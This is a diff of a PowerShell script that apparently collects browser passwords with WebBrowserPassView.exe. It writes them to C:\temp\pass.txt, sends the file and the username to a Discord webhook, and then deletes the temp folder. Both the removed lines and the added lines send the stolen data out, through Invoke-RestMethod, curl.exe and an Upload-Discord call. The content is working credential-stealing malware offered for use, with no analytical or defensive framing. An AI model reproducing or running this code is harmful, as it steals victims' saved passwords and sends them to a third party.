@@ -15,34 +15,15 @@ $DiscordUrl = 'https://discord.com/api/webhooks/1206120501471223828/xQpZHvLb0aph
 
 
 
-
 function Delete {
   cd C:\
   rmdir -R \temp
 }
 
-
-
-function Upload {
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+function Upload{
+Upload-Discord -file "C:\temp\pass.txt" -text "Browser passwords:"
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
-}
 
 function Open{
 .\WebBrowserPassView.exe
